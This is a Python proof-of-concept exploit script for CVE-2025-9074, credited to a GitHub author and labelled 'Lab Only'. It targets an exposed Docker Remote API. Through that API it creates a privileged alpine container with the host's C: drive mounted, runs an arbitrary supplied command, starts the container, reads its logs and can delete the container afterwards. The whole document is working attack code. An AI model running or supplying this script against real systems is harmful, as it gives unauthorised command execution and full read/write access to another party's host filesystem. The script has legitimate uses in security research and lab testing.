#!/usr/bin/env python3
"""
Original script by: j3r1ch0123
Source: https://github.com/j3r1ch0123/CVE-2025-9074
"""

import requests
import argparse
import json
import sys

def exploit(url, cmd, cleanup=False):
    # Auto-fix URL if missing scheme
    if not url.startswith("http"):
        url = "http://" + url
    if url.endswith("/"):
        url = url[:-1]

    # Step 1: Create container
    vuln_uri = "/containers/create"
    payload = {
        "Image": "alpine",
        "Cmd": ["sh", "-c", cmd],
        "HostConfig": {
	    "Privileged": True,
            "Binds": ["/mnt/host/c:/host_root"],
	    "NetworkMode": "none"
        },
	"WorkingDir": "/host_root"
    }

    try:
        response = requests.post(url + vuln_uri, json=payload)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] Failed to create container: {e}")
        sys.exit(1)

    create_data = response.json()
    cid = create_data.get("Id")
    print("[+] Container created:")
    print(json.dumps(create_data, indent=2))

    if not cid:
        print("[!] No container ID returned")
        return

    # Step 2: Start container
    container_uri = f"/containers/{cid}/start"
    response_two = requests.post(url + container_uri)

    if response_two.status_code == 204:
        print(f"[+] Container {cid} started successfully!")
    else:
        print("[!] Start failed:", response_two.text)
        return

    # Step 3: Fetch logs
    logs_uri = f"/containers/{cid}/logs?stdout=true&stderr=true"
    logs_resp = requests.get(url + logs_uri)
    if logs_resp.ok:
        print("[+] Container logs:\n")
        print(logs_resp.text.strip())
    else:
        print("[!] Could not fetch logs")

    # Step 4: Cleanup if requested
    if cleanup:
        stop_uri = f"/containers/{cid}/stop"
        delete_uri = f"/containers/{cid}"

        requests.post(url + stop_uri)
        requests.delete(url + delete_uri)
        print(f"[+] Container {cid} stopped and removed.")

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-9074 Docker Remote API PoC (Lab Only)"
    )
    parser.add_argument("-u", "--url", help="Docker API URL (e.g. http://127.0.0.1:2375)", required=True)
    parser.add_argument("-c", "--cmd", help="Command to execute inside the container", required=True)
    parser.add_argument("--cleanup", action="store_true", help="Stop and remove container after execution")
    args = parser.parse_args()

    exploit(args.url, args.cmd, args.cleanup)

if __name__ == "__main__":
    main()
